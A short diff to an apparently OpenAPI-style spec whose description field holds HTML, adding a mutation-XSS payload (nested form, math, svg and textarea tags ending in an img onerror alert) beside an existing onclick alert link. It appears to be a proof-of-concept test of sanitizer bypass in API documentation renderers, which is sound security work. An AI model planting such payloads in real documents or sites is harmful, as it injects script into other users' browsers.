@@ -5,6 +5,7 @@ info:
     <h1><a href="https://craftum.com" onclick="alert('XSS 1337')">Click Here</a></h1>
     <h2 style="color: #2c3e50; font-family: Arial, sans-serif;">API Reference Documentation</h2>
     <div style="background: #f8f9fa; padding: 15px; border-radius: 5px; border-left: 4px solid #3498db;">
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert("XSS 1337") src='x'>"></form>
       <p style="margin: 0;">This is a sample API documentation for demonstration purposes.</p>
     </div>
   version: "1.0.0"
